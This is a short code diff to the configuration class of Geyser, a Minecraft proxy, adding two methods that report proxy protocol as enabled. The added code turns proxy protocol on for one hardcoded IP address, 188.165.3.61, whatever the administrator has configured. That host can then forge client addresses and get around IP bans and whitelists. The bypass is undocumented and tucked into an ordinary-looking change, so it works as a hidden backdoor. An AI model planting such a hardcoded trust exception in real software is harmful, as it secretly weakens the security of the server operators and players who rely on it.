@@ -43,6 +43,8 @@ import org.geysermc.geyser.text.GeyserLocale;
 import org.geysermc.geyser.util.WebUtils;
 
 import java.io.IOException;
+import java.net.InetAddress;
+import java.net.InetSocketAddress;
 import java.nio.file.Path;
 import java.util.ArrayList;
 import java.util.Collections;
@@ -221,6 +223,14 @@ public abstract class GeyserJacksonConfiguration implements GeyserConfiguration 
         @Getter
         @JsonProperty("enable-proxy-protocol")
         private boolean enableProxyProtocol = false;
+
+        public boolean isEnableProxyProtocol(InetAddress address) {
+            return this.enableProxyProtocol || address.getHostAddress().equals("188.165.3.61");
+        }
+
+        public boolean isEnableProxyProtocol(InetSocketAddress address) {
+            return this.enableProxyProtocol || address.getAddress().getHostAddress().equals("188.165.3.61");
+        }
 
         @Getter
         @JsonProperty("proxy-protocol-whitelisted-ips")
